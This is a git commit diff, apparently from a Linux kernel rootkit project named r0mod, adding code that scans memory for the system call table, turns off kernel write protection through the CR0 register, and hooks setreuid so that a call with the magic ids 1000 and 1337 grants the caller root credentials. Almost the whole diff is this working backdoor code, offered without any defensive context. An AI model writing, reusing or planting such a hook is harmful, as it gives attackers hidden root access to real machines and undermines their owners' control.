892806f88264937e6b8f0a7a47e67f01fc71127e
ManicSec <>
2017-07-14 14:30:42 +0100

    Default

--- r0mod/r0mod.c
+++ r0mod/r0mod.c
@@ -9,6 +9,24 @@
 
 #include <r0mod/global.h>
 
+unsigned long *sct;
+
+asmlinkage int (*orig_setreuid)(uid_t ruid, uid_t euid);
+asmlinkage int new_setreuid(uid_t ruid, uid_t euid)
+{
+    printk("[trying]: ruid == %d && euid == %d\n", ruid, euid);
+
+    if((ruid == 1000) && (euid == 1337))
+    {
+        printk("[Correct]: You got the correct ids.\n");
+        commit_creds(prepare_kernel_cred(0));
+
+        return new_setreuid(0, 0);
+    }
+
+    return orig_setreuid(ruid, euid);
+}
+
 unsigned long *find_sys_call_table(void)
 {
     unsigned long i;
@@ -17,12 +35,12 @@ unsigned long *find_sys_call_table(void)
         i < (unsigned long)&boot_cpu_data;
         i += sizeof(void *))
     {
-        unsigned long *sys_call_table = (unsigned long *)i;
+        unsigned long *sct = (unsigned long *)i;
 
-        if(sys_call_table[__NR_close] == (unsigned long)sys_close)
+        if(sct[__NR_close] == (unsigned long)sys_close)
         {
-            printk("sys_call_table found @ %lx\n", (unsigned long)sys_call_table);
-            return sys_call_table;
+            printk("sys_call_table found @ %lx\n", (unsigned long)sct);
+            return sct;
         }
     }
 
@@ -33,6 +51,24 @@ static int __init r0mod_init(void)
 {
     printk("Module starting...\n");
 
+    printk("Search Start: %lx\n", (unsigned long)&loops_per_jiffy);
+    printk("Search End:   %lx\n", (unsigned long)&boot_cpu_data);
+
+    if((sct = find_sys_call_table()) == NULL)
+    {
+        printk("sct == NULL\n");
+        return -1;
+    }
+
+    printk("sys_call_table hooked @ %lx\n", (unsigned long)sct);
+
+    write_cr0(read_cr0() & (~0x10000));
+
+    orig_setreuid = (void *)sct[__NR_setreuid];
+    sct[__NR_setreuid] = (unsigned long)new_setreuid;
+
+    write_cr0(read_cr0() | 0x10000);
+
     return 0;
 }
 
@@ -41,6 +77,14 @@ static void __exit r0mod_exit(void)
 {
     printk("Module ending...\n");
 
+    if(sct != NULL)
+    {
+        write_cr0(read_cr0() & (~0x10000));
+
+        sct[__NR_setreuid] = (unsigned long)orig_setreuid;
+
+        write_cr0(read_cr0() | 0x10000);
+    }
 }
 
 MODULE_LICENSE("GPL");
